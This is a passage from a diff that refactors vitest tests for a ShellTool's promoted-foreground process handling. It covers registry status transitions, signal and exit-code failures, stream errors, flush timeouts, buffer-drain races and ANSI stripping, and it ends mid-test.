-        const entry = (registry.register as Mock).mock.calls[0][0];
-        expect(registry.complete).toHaveBeenCalledWith(
-          entry.shellId,
-          0,
-          1700000000000,
-        );
-        // Stream closed on settle.
+        expectCompleted(1700000000000);
         expect(writeStreamMock.end).toHaveBeenCalled();
       });
 
       it('non-zero exit / signal / error all transition entry to "failed" with descriptive message', async () => {
-        // Pin the failure-mode decision table.
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const invocation = shellTool.build({
-          command: 'cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 33333,
-        });
-        await promise;
-        const serviceCall = mockShellExecutionService.mock.calls[0];
-        const onSettle = (
-          serviceCall[6] as {
-            postPromote: {
-              onSettle: (info: {
-                exitCode: number | null;
-                signal: number | NodeJS.Signals | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            };
-          }
-        ).postPromote.onSettle;
-        const entry = (registry.register as Mock).mock.calls[0][0];
+        // The failure-mode decision table.
+        await runPromoted('cmd', 33333);
+        const onSettle = spawnedOnSettle();
+        const { shellId } = registeredEntry();
+        const expectFailed = (message: string, endTime: number) =>
+          expect(registry.fail).toHaveBeenCalledWith(shellId, message, endTime);
 
-        // Non-zero exitCode → fail with "Exited with code N".
         onSettle({ exitCode: 137, signal: null, endTime: 1 });
-        expect(registry.fail).toHaveBeenCalledWith(
-          entry.shellId,
-          'Exited with code 137',
-          1,
-        );
+        expectFailed('Exited with code 137', 1);
 
-        // signal-killed (no exitCode) → fail with "Terminated by signal N".
+        // Signal-killed (no exitCode).
         onSettle({ exitCode: null, signal: 15, endTime: 2 });
-        expect(registry.fail).toHaveBeenCalledWith(
-          entry.shellId,
-          'Terminated by signal 15',
-          2,
-        );
+        expectFailed('Terminated by signal 15', 2);
 
         // node-pty can preserve exitCode 0 alongside a non-zero signal.
         onSettle({ exitCode: 0, signal: 15, endTime: 2.5 });
-        expect(registry.fail).toHaveBeenCalledWith(
-          entry.shellId,
-          'Terminated by signal 15',
-          2.5,
-        );
+        expectFailed('Terminated by signal 15', 2.5);
 
         // Spawn-side error → fail with err.message.
         onSettle({
@@ -7726,479 +4437,122 @@ describe('ShellTool', () => {
           error: new Error('ENOENT'),
           endTime: 3,
         });
-        expect(registry.fail).toHaveBeenCalledWith(entry.shellId, 'ENOENT', 3);
+        expectFailed('ENOENT', 3);
       });
 
       it('treats a child-process signal string as a failed settle', async () => {
-        const registry = mockConfig.getBackgroundShellRegistry();
-        const invocation = shellTool.build({
-          command: 'cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 33334,
-        });
-        await promise;
-        const serviceCall = mockShellExecutionService.mock.calls[0];
-        const onSettle = (
-          serviceCall[6] as {
-            postPromote: {
-              onSettle: (info: {
-                exitCode: number | null;
-                signal: number | NodeJS.Signals | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            };
-          }
-        ).postPromote.onSettle;
-        const entry = (registry.register as Mock).mock.calls[0][0];
-
-        onSettle({ exitCode: null, signal: 'SIGTERM', endTime: 3.5 });
+        await runPromoted('cmd', 33334);
+        spawnedOnSettle()({ exitCode: null, signal: 'SIGTERM', endTime: 3.5 });
 
         expect(registry.fail).toHaveBeenCalledWith(
-          entry.shellId,
+          registeredEntry().shellId,
           'Terminated by signal SIGTERM',
           3.5,
         );
       });
 
       it('keeps a task_stop cancellation from being reclassified as a signal failure', async () => {
-        vi.useFakeTimers();
-        const processKillSpy = vi
-          .spyOn(process, 'kill')
-          .mockImplementation(() => true);
-        try {
-          const registry = mockConfig.getBackgroundShellRegistry();
-          const invocation = shellTool.build({
-            command: 'sleep 1',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({
-            output: '',
-            exitCode: null,
-            signal: null,
-            aborted: false,
-            promoted: true,
-            pid: 12345,
-          });
-          await promise;
+        fakeTimers();
+        const processKillSpy = spyKill();
+        await runPromoted('sleep 1', 12345);
+        const onSettle = spawnedOnSettle();
+        const entry = registeredEntry();
 
-          const serviceCall = mockShellExecutionService.mock.calls[0];
-          const onSettle = (
-            serviceCall[6] as {
-              postPromote: {
-                onSettle: (info: {
-                  exitCode: number | null;
-                  signal: number | NodeJS.Signals | null;
-                  error?: Error;
-                  endTime: number;
-                }) => void;
-              };
-            }
-          ).postPromote.onSettle;
-          const entry = (registry.register as Mock).mock.calls[0][0];
+        // `task_stop` aborts the fresh registry controller before the child
+        // reports its SIGTERM/SIGKILL settle event.
+        entry.abortController.abort();
+        await Promise.resolve();
+        expect(processKillSpy).toHaveBeenCalledWith(-12345, 'SIGTERM');
+        await vi.advanceTimersByTimeAsync(250);
+        expect(processKillSpy).toHaveBeenCalledWith(-12345, 'SIGKILL');
+        onSettle({ exitCode: 0, signal: 15, endTime: 4 });
 
-          // `task_stop` aborts the fresh registry controller before the
-          // child reports its SIGTERM/SIGKILL settle event.
-          entry.abortController.abort();
-          await Promise.resolve();
-          expect(processKillSpy).toHaveBeenCalledWith(-12345, 'SIGTERM');
-          await vi.advanceTimersByTimeAsync(250);
-          expect(processKillSpy).toHaveBeenCalledWith(-12345, 'SIGKILL');
-          onSettle({ exitCode: 0, signal: 15, endTime: 4 });
-
-          expect(registry.cancel).toHaveBeenCalledWith(entry.shellId, 4);
-          expect(registry.fail).not.toHaveBeenCalled();
-        } finally {
-          processKillSpy.mockRestore();
-          vi.useRealTimers();
-        }
+        expect(registry.cancel).toHaveBeenCalledWith(entry.shellId, 4);
+        expect(registry.fail).not.toHaveBeenCalled();
       });
 
       it('queued-settle race: onSettle fires BEFORE handlePromotedForeground completes — entry settles + llmContent reflects final status', async () => {
-        // Pin the queued-settle path: a very fast command can exit
-        // between the service-side promote-resolve and the
-        // shell.ts-side handlePromotedForeground completing the
-        // registry register + onSettleWired install. PR-2.5 absorbs
-        // that race by queueing settle info into
-        // `promoteArtifacts.settleQueued`; handlePromotedForeground
-        // drains it synchronously after wiring. Without that drain
-        // the entry would stay 'running' forever (no further onSettle
-        // ever fires — the service only emits once per promote).
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn(),
-          once: vi.fn((event: string, handler: () => void) => {
-            if (event === 'finish') handler();
-          }),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
-        const registry = mockConfig.getBackgroundShellRegistry();
+        // A fast command can exit between the service's promote-resolve and
+        // handlePromotedForeground's register + onSettleWired install. PR-2.5
+        // queues it in `promoteArtifacts.settleQueued` and drains after wiring;
+        // without that the entry stays 'running' (onSettle fires only once).
+        installWriteStream();
+        mockSettledSpawn(77777, 'final output', 1700000000123);
 
-        // Custom one-shot service impl that captures postPromote and
-        // FIRES onSettle BEFORE resolving the promise — simulates the
-        // fast-exit race window.
-        let capturedPostPromote:
-          | {
-              onSettle?: (info: {
-                exitCode: number | null;
-                signal: number | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            }
-          | undefined;
-        mockShellExecutionService.mockImplementationOnce(
-          (...args: unknown[]) => {
-            const opts = args[6] as {
-              postPromote?: typeof capturedPostPromote;
-            };
-            capturedPostPromote = opts?.postPromote;
-            // Fire onSettle SYNCHRONOUSLY before resolving (the race
-            // we're testing — settle lands while handlePromotedForeground
-            // hasn't run yet).
-            capturedPostPromote?.onSettle?.({
-              exitCode: 0,
-              signal: null,
-              endTime: 1700000000123,
-            });
-            return {
-              pid: 77777,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(''),
-                output: 'final output',
-                exitCode: null,
-                signal: null,
-                aborted: false,
-                promoted: true,
-                pid: 77777,
-                executionMethod: 'child_process',
-                error: null,
-              }),
-            };
-          },
-        );
+        const result = await build('echo hi').execute(mockAbortSignal);
 
-        const invocation = shellTool.build({
-          command: 'echo hi',
-          is_background: false,
-        });
-        const result = await invocation.execute(mockAbortSignal);
-        const entry = (registry.register as Mock).mock.calls[0][0];
-
-        // Registry transitioned to completed via the queued-settle drain.
-        expect(registry.complete).toHaveBeenCalledWith(
-          entry.shellId,
-          0,
-          1700000000123,
-        );
-
-        // Model-facing copy now says 'completed', not 'running', AND
-        // does NOT suggest task_stop (process is already gone).
-        expect(result.llmContent).toContain('Status: completed.');
-        expect(result.llmContent).not.toContain('Status: running.');
-        expect(result.llmContent).toContain('already exited');
-        expect(result.llmContent).not.toContain('task_stop({');
+        expectCompleted(1700000000123);
+        // The copy says 'completed' and does NOT suggest task_stop (the
+        // process is already gone).
+        expectExitedCopy(result, 'completed');
       });
 
       it('queued-settle race with non-zero exit code: llmContent reflects failed status', async () => {
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn(),
-          once: vi.fn((event: string, handler: () => void) => {
-            if (event === 'finish') handler();
-          }),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
-        const registry = mockConfig.getBackgroundShellRegistry();
+        installWriteStream();
+        mockSettledSpawn(88888, 'error output', 1700000000456, 1);
 
-        let capturedPostPromote:
-          | {
-              onSettle?: (info: {
-                exitCode: number | null;
-                signal: number | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            }
-          | undefined;
-        mockShellExecutionService.mockImplementationOnce(
-          (...args: unknown[]) => {
-            const opts = args[6] as {
-              postPromote?: typeof capturedPostPromote;
-            };
-            capturedPostPromote = opts?.postPromote;
-            capturedPostPromote?.onSettle?.({
-              exitCode: 1,
-              signal: null,
-              endTime: 1700000000456,
-            });
-            return {
-              pid: 88888,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(''),
-                output: 'error output',
-                exitCode: null,
-                signal: null,
-                aborted: false,
-                promoted: true,
-                pid: 88888,
-                executionMethod: 'child_process',
-                error: null,
-              }),
-            };
-          },
-        );
-
-        const invocation = shellTool.build({
-          command: 'exit 1',
-          is_background: false,
-        });
-        const result = await invocation.execute(mockAbortSignal);
-        const entry = (registry.register as Mock).mock.calls[0][0];
+        const result = await build('exit 1').execute(mockAbortSignal);
 
         expect(registry.fail).toHaveBeenCalledWith(
-          entry.shellId,
+          registeredEntry().shellId,
           'Exited with code 1',
           1700000000456,
         );
-        expect(result.llmContent).toContain('Status: failed.');
-        expect(result.llmContent).not.toContain('Status: running.');
-        expect(result.llmContent).toContain('already exited');
-        expect(result.llmContent).not.toContain('task_stop({');
+        expectExitedCopy(result, 'failed');
       });
 
       it("wave-2 (C3): llmContent reflects 'completed' even when stream.once('finish') fires asynchronously after the queued-settle drain", async () => {
-        // Regression for the C3 race: previously the model-facing
-        // status flag was only flipped INSIDE `transitionRegistry`,
-        // which `onSettleWired` defers until the output stream's
-        // `'finish'` event fires (libuv flush). For a fast-exited
-        // command whose settle arrives BEFORE handlePromotedForeground
-        // wires onSettleWired (queued-settle path), the drain happens
-        // synchronously but the actual registry transition is
-        // microtask-deferred. The old code built `llmContent` before
-        // the flag flipped → "Status: running" + `task_stop`
-        // instructions leaked into the model copy even though the
-        // child was already gone.
-        //
-        // Fix splits the flag into two: `postPromoteSettleObserved`
-        // (sync, set on classify) drives the model copy;
-        // `transitionRegistry` (async, behind finish) handles the
-        // registry side. This test captures the finish handler
-        // INSTEAD of firing it immediately, so the registry transition
-        // is genuinely deferred while we read `result.llmContent`.
+        // Regression (C3): the status flag flipped only in `transitionRegistry`,
+        // which `onSettleWired` defers to 'finish'; on the queued-settle path
+        // `llmContent` said "Status: running" + `task_stop` for a gone child.
+        // The fix: `postPromoteSettleObserved` (sync, on classify) drives the
+        // copy, `transitionRegistry` (behind finish) the registry. The finish
+        // handler is captured, not fired, to keep the transition deferred.
         let capturedFinishHandler: (() => void) | null = null;
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn(),
+        installWriteStream({
           once: vi.fn((event: string, handler: () => void) => {
             if (event === 'finish') capturedFinishHandler = handler;
           }),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
-        const registry = mockConfig.getBackgroundShellRegistry();
-
-        let capturedPostPromote:
-          | {
-              onSettle?: (info: {
-                exitCode: number | null;
-                signal: number | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            }
-          | undefined;
-        mockShellExecutionService.mockImplementationOnce(
-          (...args: unknown[]) => {
-            const opts = args[6] as {
-              postPromote?: typeof capturedPostPromote;
-            };
-            capturedPostPromote = opts?.postPromote;
-            // Fast-exit race: fire onSettle BEFORE resolve so
-            // settleQueued path is exercised.
-            capturedPostPromote?.onSettle?.({
-              exitCode: 0,
-              signal: null,
-              endTime: 1700000000999,
-            });
-            return {
-              pid: 88888,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(''),
-                output: 'fast output',
-                exitCode: null,
-                signal: null,
-                aborted: false,
-                promoted: true,
-                pid: 88888,
-                executionMethod: 'child_process',
-                error: null,
-              }),
-            };
-          },
-        );
-
-        const invocation = shellTool.build({
-          command: 'true',
-          is_background: false,
         });
-        const result = await invocation.execute(mockAbortSignal);
-        const entry = (registry.register as Mock).mock.calls[0][0];
+        mockSettledSpawn(88888, 'fast output', 1700000000999);
 
-        // Stream's 'finish' handler captured but NOT yet invoked, so
-        // the registry transition is genuinely deferred at this point.
+        const result = await build('true').execute(mockAbortSignal);
+
+        // 'finish' captured but not invoked: the transition is still deferred…
         expect(capturedFinishHandler).not.toBeNull();
         expect(registry.complete).not.toHaveBeenCalled();
+        // …yet the copy reports the terminal status.
+        expectExitedCopy(result, 'completed');
 
-        // Model-facing copy still reports the correct terminal status
-        // because `postPromoteSettleObserved` was flipped sync inside
-        // onSettleWired BEFORE the stream-finish wait began.
-        expect(result.llmContent).toContain('Status: completed.');
-        expect(result.llmContent).not.toContain('Status: running.');
-        expect(result.llmContent).toContain('already exited');
-        expect(result.llmContent).not.toContain('task_stop({');
-
-        // Fire 'finish' now — registry transition runs post-flush.
+        // Fire 'finish' now: the registry transition runs post-flush.
         capturedFinishHandler!();
-        expect(registry.complete).toHaveBeenCalledWith(
-          entry.shellId,
-          0,
-          1700000000999,
-        );
+        expectCompleted(1700000000999);
       });
 
       it('wave-2 (C1): stream open async error transitions registry — does not hang waiting on `finish`', async () => {
-        // Regression for C1: `fs.createWriteStream` reports common
-        // open failures (ENOENT / EACCES / ENOSPC) via an async
-        // 'error' event, NOT by throwing. Before the fix, the
-        // 'error' listener only logged; `promoteArtifacts.stream`
-        // kept pointing at the already-broken stream, and
-        // `onSettleWired` attached a `.once('finish', ...)` listener
-        // that would never fire → registry stuck on `running` forever.
-        // Fix: the error listener latches `streamClosed`, nulls the
-        // shared `stream` slot, and `onSettleWired`'s existing
-        // `if (!stream)` branch transitions the registry immediately.
-        const errorListeners: Array<(err: Error) => void> = [];
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn((event: string, handler: (err: Error) => void) => {
-            if (event === 'error') errorListeners.push(handler);
-          }),
-          once: vi.fn((event: string, handler: () => void) => {
-            // Production code attaches finish/error AFTER stream is
-            // pulled into a local var; in the failure path it
-            // shouldn't reach here at all because `stream` is null.
-            // Capture but do nothing — the test verifies the registry
-            // transition runs WITHOUT firing this handler.
-            void event;
-            void handler;
-          }),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
-        const registry = mockConfig.getBackgroundShellRegistry();
+        // Regression (C1): open failures (ENOENT / EACCES / ENOSPC) arrive as an
+        // async 'error', not a throw. The listener only logged, `stream` kept
+        // the broken stream, and `onSettleWired` waited on a 'finish' that
+        // never fires (stuck `running`). The latch nulls `stream`, so the
+        // `if (!stream)` branch transitions without 'finish' (captured, unfired).
+        const errorListeners = installErroringStream();
+        await runPromoted('sleep 1', 99999);
 
-        const invocation = shellTool.build({
-          command: 'sleep 1',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 99999,
-        });
-        await promise;
-
-        // Stream-open async error: emit ENOSPC AFTER stream is
-        // assigned to `promoteArtifacts.stream`. The latch nulls
-        // the shared slot.
+        // ENOSPC after the stream is assigned: the latch nulls the slot.
         expect(errorListeners.length).toBeGreaterThan(0);
-        errorListeners[0](
-          Object.assign(new Error('disk full'), { code: 'ENOSPC' }),
-        );
+        errorListeners[0](diskFull());
 
-        // Now drive onSettle — the wired handler sees
-        // `promoteArtifacts.stream === null` and transitions
-        // immediately (no finish wait), so the entry doesn't stay
-        // running.
-        const serviceCall = mockShellExecutionService.mock.calls[0];
-        const onSettle = (
-          serviceCall[6] as {
-            postPromote: {
-              onSettle: (info: {
-                exitCode: number | null;
-                signal: number | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            };
-          }
-        ).postPromote.onSettle;
-        onSettle({ exitCode: 0, signal: null, endTime: 1700000111111 });
+        // onSettle sees `stream === null` and transitions without waiting.
+        spawnedOnSettle()(settled(1700000111111));
 
-        const entry = (registry.register as Mock).mock.calls[0][0];
-        expect(registry.complete).toHaveBeenCalledWith(
-          entry.shellId,
-          0,
-          1700000111111,
-        );
+        expectCompleted(1700000111111);
       });
 
       it('stream open async error writes diagnostic marker via appendFileSync', async () => {
-        const errorListeners: Array<(err: Error) => void> = [];
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn((event: string, handler: (err: Error) => void) => {
-            if (event === 'error') errorListeners.push(handler);
-          }),
-          once: vi.fn(),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
+        const errorListeners = installErroringStream();
+        await runPromoted('sleep 1', 99998);
 
-        const invocation = shellTool.build({
-          command: 'sleep 1',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveShellExecution({
-          output: '',
-          exitCode: null,
-          signal: null,
-          aborted: false,
-          promoted: true,
-          pid: 99998,
-        });
-        await promise;
-
-        errorListeners[0](
-          Object.assign(new Error('disk full'), { code: 'ENOSPC' }),
-        );
+        errorListeners[0](diskFull());
 
         expect(fs.appendFileSync).toHaveBeenCalledWith(
           expect.stringContaining('bg_'),
@@ -8207,174 +4561,50 @@ describe('ShellTool', () => {
       });
 
       it('flush timeout transitions registry when stream.finish never fires', async () => {
-        vi.useFakeTimers();
-        try {
-          const writeStreamMock = {
-            write: vi.fn(),
-            end: vi.fn(),
-            on: vi.fn(),
-            once: vi.fn(),
-          };
-          vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-            writeStreamMock as unknown as fs.WriteStream,
-          );
-          const registry = mockConfig.getBackgroundShellRegistry();
+        fakeTimers();
+        installWriteStream({ once: vi.fn() });
+        await runPromoted('sleep 1', 99997);
 
-          const invocation = shellTool.build({
-            command: 'sleep 1',
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveShellExecution({
-            output: '',
-            exitCode: null,
-            signal: null,
-            aborted: false,
-            promoted: true,
-            pid: 99997,
-          });
-          await promise;
+        spawnedOnSettle()(settled(1700000222222));
 
-          const serviceCall = mockShellExecutionService.mock.calls[0];
-          const onSettle = (
-            serviceCall[6] as {
-              postPromote: {
-                onSettle: (info: {
-                  exitCode: number | null;
-                  signal: number | null;
-                  error?: Error;
-                  endTime: number;
-                }) => void;
-              };
-            }
-          ).postPromote.onSettle;
+        // 'finish' never fired: no transition yet…
+        expect(registry.complete).not.toHaveBeenCalled();
 
-          onSettle({ exitCode: 0, signal: null, endTime: 1700000222222 });
-
-          // stream.once('finish') was NOT fired — registry should
-          // NOT have transitioned yet.
-          expect(registry.complete).not.toHaveBeenCalled();
-
-          // Advance past the 10s flush timeout.
-          vi.advanceTimersByTime(10_001);
-
-          const entry = (registry.register as Mock).mock.calls[0][0];
-          expect(registry.complete).toHaveBeenCalledWith(
-            entry.shellId,
-            0,
-            1700000222222,
-          );
-        } finally {
-          vi.useRealTimers();
-        }
+        // …until the 10s flush timeout passes.
+        vi.advanceTimersByTime(10_001);
+        expectCompleted(1700000222222);
       });
 
       it('wave-3 (T2): onSettleWired drains pre-settle buffer AND latches streamClosed so post-end chunks drop instead of leaking the buffer', async () => {
-        // Regression for the buffer-drain race: previously
-        // `onSettleWired` set `promoteArtifacts.stream = null` BEFORE
-        // calling `stream.end()`. Any `onData` chunk that arrived
-        // between the null assignment and the `'finish'` event saw
-        // `stream === null && streamClosed === false` and pushed
-        // into `promoteArtifacts.buffer` — which has no further
-        // drain path (the foreground finalizer has already
-        // returned). Result: chunks stranded forever, no
-        // observability. Fix drains the buffer to the stream BEFORE
-        // nulling AND latches `streamClosed=true` so any subsequent
-        // chunks DROP via the third branch of `onData` instead.
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn(),
-          once: vi.fn(),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
+        // Regression: `onSettleWired` nulled `promoteArtifacts.stream` BEFORE
+        // `stream.end()`, so a chunk before 'finish' (`stream === null &&
+        // !streamClosed`) went into a buffer with no drain path left: stranded
+        // unobserved. Now the buffer drains before nulling and `streamClosed`
+        // latches, so later chunks DROP (onData's third branch).
+        const writeStreamMock = installWriteStream({ once: vi.fn() });
+        const postPromote = mockPromotedSpawn(55555, 'snapshot');
+        const onData = (chunk: string) =>
+          postPromote()?.onData?.({ type: 'data', chunk });
 
-        let capturedPostPromote:
-          | {
-              onData?: (event: {
-                type: string;
-                chunk: string | unknown;
-              }) => void;
-              onSettle?: (info: {
-                exitCode: number | null;
-                signal: number | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            }
-          | undefined;
-        mockShellExecutionService.mockImplementationOnce(
-          (...args: unknown[]) => {
-            const opts = args[6] as {
-              postPromote?: typeof capturedPostPromote;
-            };
-            capturedPostPromote = opts?.postPromote;
-            return {
-              pid: 55555,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(''),
-                output: 'snapshot',
-                exitCode: null,
-                signal: null,
-                aborted: false,
-                promoted: true,
-                pid: 55555,
-                executionMethod: 'child_process',
-                error: null,
-              }),
-            };
-          },
-        );
-
-        const invocation = shellTool.build({
-          command: 'sleep 1',
-          is_background: false,
-        });
-        // Fire a pre-settle data chunk BEFORE awaiting — it lands
-        // in the pre-finalizer service-side window. Then await the
-        // execute (handlePromotedForeground completes, drains the
-        // buffer into stream, wires onSettleWired).
-        const promise = invocation.execute(mockAbortSignal);
-        // The service-side mock has been called by now (synchronous
-        // up to the resolved promise return); fire onData on its
-        // captured postPromote.
+        const promise = build('sleep 1').execute(mockAbortSignal);
+        // The service mock has run by now. A chunk arriving before
+        // handlePromotedForeground opens the stream is buffered, then drained.
         await new Promise((resolve) => setImmediate(resolve));
-        // First chunk: arrives BEFORE handlePromotedForeground opens
-        // the stream → buffered in `promoteArtifacts.buffer`. After
-        // handlePromotedForeground drains, this gets written.
-        capturedPostPromote?.onData?.({ type: 'data', chunk: 'pre1' });
+        onData('pre1');
         await promise;
-
-        // After handlePromotedForeground: stream is non-null and
-        // pre1 has been written into it (drained from buffer).
         expect(writeStreamMock.write).toHaveBeenCalledWith('pre1');
 
-        // Now push a chunk that lands between handlePromotedForeground
-        // and settle (still buffered in the service-side window).
-        // Since handlePromotedForeground has already opened the stream
-        // and drained, this chunk goes straight through stream.write.
-        capturedPostPromote?.onData?.({ type: 'data', chunk: 'mid1' });
+        // Between handlePromotedForeground and settle: straight to the stream.
+        onData('mid1');
         expect(writeStreamMock.write).toHaveBeenCalledWith('mid1');
 
-        // Fire settle. onSettleWired now drains any remaining buffer,
-        // nulls stream, latches streamClosed.
-        capturedPostPromote?.onSettle?.({
-          exitCode: 0,
-          signal: null,
-          endTime: 1700001111111,
-        });
+        // Settle drains any remaining buffer, nulls stream, latches streamClosed.
+        postPromote()?.onSettle?.(settled(1700001111111));
 
-        // POST-SETTLE chunks (kernel buffer race) — must DROP, not
-        // accumulate in the buffer. Before the wave-3 fix this would
-        // push into `promoteArtifacts.buffer` and leak.
-        capturedPostPromote?.onData?.({ type: 'data', chunk: 'post1' });
-        capturedPostPromote?.onData?.({ type: 'data', chunk: 'post2' });
-
-        // Stream.write should NOT have been called for post-settle
-        // chunks (stream is null + streamClosed latched → onData's
-        // third branch drops).
+        // POST-SETTLE chunks (kernel buffer race) must DROP, not accumulate
+        // in the buffer (the pre-wave-3 leak).
+        onData('post1');
+        onData('post2');
         const writeCalls = writeStreamMock.write.mock.calls.map(
           (c: unknown[]) => c[0],
         );
@@ -8383,171 +4613,59 @@ describe('ShellTool', () => {
       });
 
       it('wave-3 (T3): catch-path clears the buffered chunks and falls back to writeFileSync(snapshot)', async () => {
-        // Regression for the silent-drop critique: when
-        // createWriteStream throws (rare, but ENOENT on a vanished
-        // tmpdir is plausible), chunks already in
-        // `promoteArtifacts.buffer` cannot be salvaged. The fix
-        // empties the buffer (so any later code paths can't see
-        // stale chunks) and logs the count for oncall observability
-        // (the log itself is verified by `debugLogger` integration —
-        // not asserted here because debugLogger has no global
-        // session in test setup, so the log is a side-effect-only
-        // observability tool). Behaviorally the test verifies that
-        // (a) writeFileSync snapshot fallback runs, (b) the path
-        // does not crash, (c) a post-buffer-drain settle still
-        // transitions the registry.
+        // Regression for the silent drop: if createWriteStream throws (e.g.
+        // ENOENT on a vanished tmpdir), buffered chunks can't be salvaged; the
+        // buffer is emptied (no stale chunks later) and the count logged for
+        // oncall (not asserted: debugLogger has no session in tests). Checks:
+        // the writeFileSync snapshot fallback, no crash, a later settle.
         vi.mocked(fs.createWriteStream).mockImplementationOnce(() => {
           throw Object.assign(new Error('ENOENT no tmpdir'), {
             code: 'ENOENT',
           });
         });
-        // Spy on writeFileSync (the snapshot fallback) — passthrough
-        // implementation since the default mock would be no-op.
+        // Passthrough, since the default mock would be a no-op.
         const writeFileSyncSpy = vi
           .mocked(fs.writeFileSync)
           .mockImplementationOnce(() => undefined);
 
-        const registry = mockConfig.getBackgroundShellRegistry();
-        let capturedPostPromote:
-          | {
-              onData?: (event: { type: string; chunk: unknown }) => void;
-              onSettle?: (info: {
-                exitCode: number | null;
-                signal: number | null;
-                error?: Error;
-                endTime: number;
-              }) => void;
-            }
-          | undefined;
-        mockShellExecutionService.mockImplementationOnce(
-          (...args: unknown[]) => {
-            const opts = args[6] as {
-              postPromote?: typeof capturedPostPromote;
-            };
-            capturedPostPromote = opts?.postPromote;
-            // Fire 3 pre-finalizer chunks → all queue in buffer.
-            capturedPostPromote?.onData?.({ type: 'data', chunk: 'a' });
-            capturedPostPromote?.onData?.({ type: 'data', chunk: 'b' });
-            capturedPostPromote?.onData?.({ type: 'data', chunk: 'c' });
-            return {
-              pid: 44444,
-              result: Promise.resolve({
-                rawOutput: Buffer.from(''),
-                output: 'snap',
-                exitCode: null,
-                signal: null,
-                aborted: false,
-                promoted: true,
-                pid: 44444,
-                executionMethod: 'child_process',
-                error: null,
-              }),
-            };
-          },
-        );
-
-        const invocation = shellTool.build({
-          command: 'whatever',
-          is_background: false,
+        // 3 pre-finalizer chunks, all queued in the buffer.
+        const postPromote = mockPromotedSpawn(44444, 'snap', (pp) => {
+          pp?.onData?.({ type: 'data', chunk: 'a' });
+          pp?.onData?.({ type: 'data', chunk: 'b' });
+          pp?.onData?.({ type: 'data', chunk: 'c' });
         });
-        await invocation.execute(mockAbortSignal);
 
-        // writeFileSync called with the snapshot (the recoverable
-        // fallback).
+        await build('whatever').execute(mockAbortSignal);
+
         expect(writeFileSyncSpy).toHaveBeenCalledWith(
           expect.any(String),
           'snap',
         );
 
-        // Post-settle chunks must not surface anywhere either —
-        // streamClosed was set by the catch path so subsequent
-        // onData chunks drop. Drive a settle, then a late chunk;
-        // verify the registry still transitions normally and the
+        // The catch path set streamClosed: a settle still transitions and a
         // late chunk is dropped without crashing.
-        capturedPostPromote?.onSettle?.({
-          exitCode: 0,
-          signal: null,
-          endTime: 1700002222222,
-        });
-        capturedPostPromote?.onData?.({ type: 'data', chunk: 'post-settle' });
+        postPromote()?.onSettle?.(settled(1700002222222));
+        postPromote()?.onData?.({ type: 'data', chunk: 'post-settle' });
 
-        const entry = (registry.register as Mock).mock.calls[0][0];
-        expect(registry.complete).toHaveBeenCalledWith(
-          entry.shellId,
-          0,
-          1700002222222,
-        );
+        expectCompleted(1700002222222);
       });
 
       it('wave-4 (T4): post-promote `onData` chunks have ANSI stripped before write (matches executeBackground file format)', async () => {
-        // Regression for the format-mismatch critique: the regular
-        // `executeBackground` path strips ANSI before writing to the
-        // background output file, but the promoted-foreground onData
-        // path used to write raw chunks. After Ctrl+B, the file would
-        // be plain text up to the snapshot then raw `\x1b[31m` /
-        // cursor-move / clear-screen sequences for the post-promote
-        // tail — unreadable for an agent that just `Read`s the file.
-        // Fix applies stripAnsi() in onData before writing/buffering.
-        const writeStreamMock = {
-          write: vi.fn(),
-          end: vi.fn(),
-          on: vi.fn(),
-          once: vi.fn((event: string, handler: () => void) => {
-            if (event === 'finish') handler();
-          }),
-        };
-        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
-          writeStreamMock as unknown as fs.WriteStream,
-        );
+        // Regression: executeBackground strips ANSI before writing but the
+        // promoted onData path wrote raw chunks, so after Ctrl+B the file
+        // turned into `\x1b[31m` / cursor-move / clear-screen noise past the
+        // snapshot, unreadable for an agent that `Read`s it.
+        const writeStreamMock = installWriteStream();
